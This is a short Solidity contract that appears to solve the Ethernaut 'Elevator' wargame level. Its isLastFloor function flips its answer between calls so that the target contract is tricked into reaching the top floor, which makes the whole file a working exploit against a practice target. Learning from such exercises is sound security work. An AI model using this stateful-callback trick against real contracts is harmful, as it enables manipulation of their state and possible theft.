// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import {Building} from "./Elevator.sol";

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract ElevatorAttacker is Building {
    IElevator public immutable elevator;
    bool private isLast = true;

    uint256 private constant FLOOR_NUM = 1;

    constructor(address _elevator) {
        elevator = IElevator(_elevator);
    }

    function attack() external {
        elevator.goTo(FLOOR_NUM);
    }

    function isLastFloor(uint256 /*_floor*/ ) external returns (bool) {
        isLast = !isLast;
        return isLast;
    }
}
